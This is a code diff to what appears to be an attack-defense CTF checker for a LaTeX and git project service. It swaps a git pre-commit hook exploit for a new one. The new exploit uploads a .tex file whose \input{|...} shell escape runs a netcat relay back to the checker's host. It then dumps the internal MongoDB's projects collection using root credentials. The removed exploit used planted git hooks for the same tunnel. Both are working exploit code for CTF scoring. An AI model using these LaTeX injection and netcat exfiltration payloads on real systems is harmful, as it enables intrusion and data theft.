@@ -113,7 +113,7 @@ async def exploit_read_symlink(task: ExploitCheckerTaskMessage, client: AsyncCli
     if flag := searcher.search_flag(file):
         return flag
 
-@checker.exploit(2)
+@checker.exploit(1)
 async def exploit_git_clone_from_container(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
     (_, _, _, id) = await create_user_and_project(client, None, logger)
 
@@ -179,52 +179,37 @@ async def getflag_one(task: GetflagCheckerTaskMessage, client: AsyncClient, db: 
     
     raise MumbleException("Flag not found.")
 
-@checker.exploit(1)
-async def exploit_git_hooks(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+@checker.exploit(2)
+async def exploit_connect_to_mongodb(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter):
+    (_, _, _, id) = await create_user_and_project(client, None, logger)
+
     attack_info = json.loads(task.attack_info)
     if 'username' not in attack_info:
         raise MumbleException("Missing username in attack_info")
-        
-    # create a project
-    (username, password, _, id) = await create_user_and_project(client, None, logger)
-    path_in_container = "/data"
-    # clone it locally
-    path = await clone_project(username, password, id, task.address, logger)
-    # setup a symlink to the git folder
-    os_succ(os.system(f"ln -s ./.git {path}/git"))
-    # setup a folder for a symlink to the pre-commit hook
-    os_succ(os.system(f"mkdir -p {path}/hooks"))
-    os_succ(os.system(f"ln -s ../.git/hooks/pre-commit.sample {path}/hooks/pre-commit"))
 
-    await git_config_commit_and_push(path, username, "Exploit!", logger)
-
-    await cleanup_clone(path)
-
-    # let the server pull the changes
-    await pull(client, id, logger)
-
-    # change the hook path used
-    config_str = await download_file(client, id, "git/config", logger)
-    lines = config_str.split("\n")
-    lines.insert(1, f"\thooksPath = {path_in_container}/hooks")
-    config_str = "\n".join(lines)
-    await upload_file(client, id, "git/config", config_str, logger)
-
-    forward_code = f"while true; do nc {checker_ip} {checker_forward_port_2} -e /usr/bin/nc db 27017 && break; done"
-    await upload_file(client, id, "hooks/pre-commit", f"#!/bin/sh\n{forward_code}", logger)
-
-    await upload_file(client, id, "someChangedFile", "this file is new!", logger)
-
-    dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
-
+    # gizmo to forward a connection
     forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port_2, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
+    
+    dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
     dump = subprocess.Popen(["bash", '-c', f"while true; do {dump_command} && break; done"])
-
-    await commit(client, id, "Exploit!", logger, True) # trigger the pre-commit hook
+    
+    commands = f"while true; do nc {checker_ip} {checker_forward_port_2} -e \"/usr/bin/nc db 27017\"; done"
+    
+    file_content = """\\documentclass[12pt]{minimal}
+\\usepackage{verbatim}
+\\begin{document}
+    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
+\\end{document}
+"""
+    await upload_file(client, id, "main.tex", file_content, logger)
+    await compile(client, id, "main.tex", logger, True)
 
     forward.kill()
-    dump.kill()
+    forward.wait()
 
+    dump.kill()
+    dump.wait()
+ 
     if not os.path.exists("/tmp/dump.json"):
         raise MumbleException("Dump file not found")
 
